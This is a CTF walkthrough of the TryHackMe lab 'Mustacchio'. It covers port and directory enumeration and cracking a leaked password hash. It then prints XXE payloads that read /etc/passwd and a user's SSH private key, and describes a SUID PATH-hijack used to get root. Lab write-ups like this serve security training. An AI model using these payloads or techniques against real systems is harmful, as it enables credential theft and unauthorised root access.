---
title: "TryHackMe - Mustacchio"
author: Nasrallah
description: ""
date: 2022-10-05 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, xml, xxe, crack, john, suid]
img_path: /assets/img/tryhackme/mustacchio
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Mustacchio](https://tryhackme.com/room/) from [TryHackMe](https://tryhackme.com). We find a webserver vulnerable to xxe allowing to read file on the system and getting an ssh key. After that we exploit an SUID binary to get root.

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.152.28                                                                                                                            
Host is up (0.093s latency).                                                  
Not shown: 998 filtered tcp ports (no-response)                                                                                                              
PORT   STATE SERVICE VERSION                                                  
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)                                                                           
| ssh-hostkey:                                                                
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)                                                                                               
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)               
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)                                                                                            
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))                                                                                                          
| http-robots.txt: 1 disallowed entry                                                                                                                        
|_/                                                                                                                                                          
|_http-title: Mustacchio | Home                                                                                                                              
|_http-server-header: Apache/2.4.18 (Ubuntu)                                                                                                                 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 
```

We found 2 open ports on an Ubuntu machine, 22(ssh) and 80(http).

## Web

Let's navigate to the web page.

![](1.png)

Nothing seems useful here so let's run a directory scan.

```terminal
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.138.123/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/13 06:41:31 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/custom               (Status: 301) [Size: 315] [--> http://10.10.138.123/custom/]
/fonts                (Status: 301) [Size: 314] [--> http://10.10.138.123/fonts/] 
/images               (Status: 301) [Size: 315] [--> http://10.10.138.123/images/]
/index.html           (Status: 200) [Size: 1752]                                  
/robots.txt           (Status: 200) [Size: 28]                                    
/server-status        (Status: 403) [Size: 278]                                   
===============================================================
```

Found robots.txt but it doesn't have much for us, let's check the **/custom** directory.

![](2.png)

Found a backup file, let's download it.

```terminal
$ file users.bak  
users.bak: SQLite 3.x database, last written using SQLite version 3034001, file counter 2, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 2
```

The file is a `sqlite` databse, we can inspect it with `sqlitebrowser`.

![](3.png)

We found a hash, let's crack it on [crackstation](https://crackstation.net/).

![](4.png)

Got the password, but for what.

Let's continue our enumeration by scanning all port

```terminal
$ sudo nmap -min-rate 5000 -p- 10.10.152.28                                                                                                                
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-16 05:14 EDT               
Nmap scan report for 10.10.152.28                                                                                                                            
Host is up (0.44s latency).                                                   
Not shown: 65532 filtered tcp ports (no-response)                                                                                                            
PORT     STATE SERVICE                                                                                                                                       
22/tcp   open  ssh                                                                                                                                           
80/tcp   open  http                                                                                                                                          
8765/tcp open  ultraseek-http   


$ sudo nmap -sC -sV -T4 10.10.152.28 -p 8765                          
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-16 05:25 EDT
Nmap scan report for 10.10.152.28 
Host is up (0.22s latency).                                                   
                                       
PORT     STATE SERVICE VERSION                                                
8765/tcp open  http    nginx 1.10.3 (Ubuntu)  
|_http-title: Mustacchio | Login                                              
|_http-server-header: nginx/1.10.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
```

We found another open port running nginx web server. Let's go there.

![](5.png)

Found a login page, let's login with the password we cracked earlier.

![](6.png)

We can add comments. Let's check the source code.

![](7.png)

There is a file at **/auth** called **dontforget.bak** and it seems we need to find an ssh private key.

Navigating to the backup file it get's downloaded.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>   
```

This looks like the xml used by the website to add comments, it seems we are going to exploit an XXE vulnerability.

Let's add a comment and intercept the request with `burp`.

![](8.png)

Now replace the xml value with the following payload.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
```

![](10.png)

Got it.

URL encode the payload by selecting it and pressing `ctrl + u` then send the request.

![](9.png)

Great! We confirmed the XXE vulnerability, now let's get barry's ssh private key.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///home/barry/.ssh/id_rsa'>]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
```

![](10.png)

# **Foothold**

Let's copy the key to our machine, give it the right permission and connect with it.

![](11.png)

The key is protected with a password so we used `ssh2john` to get a hash for that password and then cracked it to get the password.

# **Privilege Escalation**

Let's search for SUID binaries wit the command `find / -type f -perm -u=s 2>/dev/null`.

```terminal
barry@mustacchio:~$ find / -type f -perm -u=s 2>/dev/null 
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/at
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/newuidmap
/usr/bin/gpasswd
/home/joe/live_log
/bin/ping
/bin/ping6
/bin/umount
/bin/mount
/bin/fusermount
/bin/su
```

We find a binary in joe's home directory called `live_log`, let's check it out.

```
barry@mustacchio:/home/joe$ file live_log                                     
live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a6809
4c63347aeb02281a45518964ad12abe, for GNU/Linux 3.2.0, not stripped            
barry@mustacchio:/home/joe$ strings live_log                                                                                              

[** SNIP **]

Live Nginx Log Reader
tail -f /var/log/nginx/access.log

[** SNIP **]
```

The file is an executable, running `strings` on it we find that it runs `tail` without a path.

We can write a script that that executes bash, name it `tail`, put it in /tmp directory for example and add that directory to the PATH variable. When the `live_log` program run it will execute out `tail` program.

![](12.png)

And just like that we got root.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

# References
